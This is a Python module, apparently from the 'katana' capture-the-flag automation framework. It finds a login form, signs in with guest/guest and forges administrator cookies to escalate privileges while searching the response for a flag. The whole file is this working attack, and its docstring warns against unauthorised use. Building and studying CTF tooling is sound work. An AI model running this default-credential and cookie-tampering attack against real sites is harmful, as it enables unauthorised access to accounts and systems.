"""
Add or adjust cookies after fake logon.

This unit will attempt to authenticate with the credentials ``guest/guest`` 
and then adjust the found cookies to claim that this user has administrator
privileges.

It passes a User-Agent to act as a regular Firefox web browser.

This unit inherits from :class:`katana.units.web.WebUnit` as that contains
lots of predefined variables that can be used throughout multiple web units.

.. warning::
    
    This unit automatically attempts to perform malicious actions on the 
    target. **DO NOT** use this in any circumstances where you do not have the
    authority to operate!

"""

import re
import requests

from katana.unit import NotApplicable
from katana.units.web import WebUnit
from katana.units import web


class Unit(WebUnit):

    GROUPS = ["web", "cookies", "logon_cookies"]
    """
    These are "tags" for a unit. Considering it is a Web unit, "web"
    is included, as well as the name of the unit, "logon_cookies".
    """

    RECURSE_SELF = False
    """
    This unit does not recures into itself. 
    It would not make sense to recurse on cookies
    """

    PRIORITY = 30
    """
    Priority works with 0 being the highest priority, and 100 being the 
    lowest priority. 50 is the default priorty. This unit has moderately
    high priority due to speed and broadness of applicability
    """

    def __init__(self, *args, **kwargs):
        """
        The constructor is included to first determine if there is a form
        on this web page. If no form is found, it will abort.
        """

        # Run the parent constructor, to ensure this is a valid URL
        super(Unit, self).__init__(*args, **kwargs)

        # Look for form actions on the page
        self.action = re.findall(
            rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        self.method = re.findall(
            rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )

        # Look for username and password entries on the page
        self.username = re.findall(
            web.user_regex, self.target.content, flags=re.IGNORECASE
        )
        self.password = re.findall(
            web.pass_regex, self.target.content, flags=re.IGNORECASE
        )

        # Only run this if we have potential information...
        if not (self.action and self.method and self.username and self.password):
            raise NotApplicable("no form found")

    def evaluate(self, case):
        """
        Evaluate the target. Authenticate to the site with a bogey login and
        then adjust or add cookies.

        :param case: A case returned by ``enumerate``. For this unit,\
        the ``enumerate`` function is not used.

        :return: None. This function should not return any data.
        """

        # If we find this actions, decode them to values we can use
        if self.action and self.method and self.username and self.password:
            if self.action:
                action = self.action[0].decode("utf-8")
            if self.method:
                method = self.method[0].decode("utf-8")
            if self.username:
                username = self.username[0].decode("utf-8")
            if self.password:
                password = self.password[0].decode("utf-8")

            s = requests.Session()

            # Attempt a default login
            try:
                r = s.request(
                    method.lower(),
                    self.target.url_root.rstrip("/") + "/" + action,
                    data={username: "guest", password: "guest"},
                )
            except:
                # JOHN: Theoretically, if we find a valid method,
                #  this should not error... But if it does, ... give up??
                return

            # Check out the cookies. Flip them if boolean, and look for flags.
            if s.cookies:
                for admin_cookie in web.potential_cookie_names:
                    if admin_cookie in s.cookies.keys():
                        if s.cookies[admin_cookie] == "False":
                            s.cookies.update({admin_cookie: "True"})
                            new = requests.get(r.url, cookies={admin_cookie: "True"})

                            if self.manager.find_flag(self, new.text):
                                break
                        else:
                            s.cookies.update({admin_cookie: "1"})
                            new = requests.get(r.url, cookies={admin_cookie: "1"})
                            if self.manager.find_flag(self, new.text):
                                break
            else:
                s.cookies.update({"admin": "1"})
                new = s.get(r.url, cookies={"admin": "1"})
                if self.manager.find_flag(self, new.text):
                    return
